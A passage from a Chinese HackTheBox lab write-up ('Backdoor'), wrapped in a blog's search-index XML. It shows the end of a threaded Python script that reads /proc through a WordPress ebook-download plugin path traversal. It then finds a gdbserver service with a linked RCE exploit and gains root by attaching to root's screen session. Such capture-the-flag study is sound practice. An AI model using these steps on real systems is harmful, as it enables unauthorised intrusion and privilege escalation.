u&#x3D;&quot;http:&#x2F;&#x2F;10.10.11.125&#x2F;wp-content&#x2F;plugins&#x2F;ebook-download&#x2F;filedownload.php?ebookdownloadurl&#x3D;&#x2F;proc&#x2F;&quot;    with ThreadPoolExecutor(max_workers&#x3D;100) as executor:        executor.map(burst,list)    print(&#39;the result is &#39;+b)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2022/08/31/backdoor/image_lJWe--sjW2.png"></p><p>最终得到结果 1337端口开放了一个gdbserver服务</p><p>通过搜索找到了一个rce漏洞</p><p><a href="https://www.exploit-db.com/exploits/50539" title="https://www.exploit-db.com/exploits/50539">https://www.exploit-db.com/exploits/50539</a></p><p><img src="/2022/08/31/backdoor/image_20Ohw3UZ5S.png"></p><p><img src="/2022/08/31/backdoor/image_BxbtrWOqPV.png"></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>这里通过suid提权搜索</p><p><img src="/2022/08/31/backdoor/image_S24ft9PZCC.png"></p><p>发现screen,首先看下screen有没有开着任务</p><p><img src="/2022/08/31/backdoor/image_thFd7tVwgA.png"></p><p>发现root用户开着一个名称为root的screen作业，那么我们便可以通过切换到此作业实现提权</p><p>首先设置终端类型</p><pre class="line-numbers language-react&#x20;jsx" data-language="react&#x20;jsx"><code class="language-react&#x20;jsx">export TREM&#x3D;xtrem<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>接着恢复此作业</p><pre class="line-numbers language-react&#x20;jsx" data-language="react&#x20;jsx"><code class="language-react&#x20;jsx">screen -x root&#x2F;root<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里卡了半天，普通用户切换到root用户的screen作业得在前面加个root&#x2F;  才行</p><p><img src="/2022/08/31/backdoor/image_4QH0wtRYd4.png"></p>]]></content>
      
      
      <categories>
          
          <category> HackTheBox </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
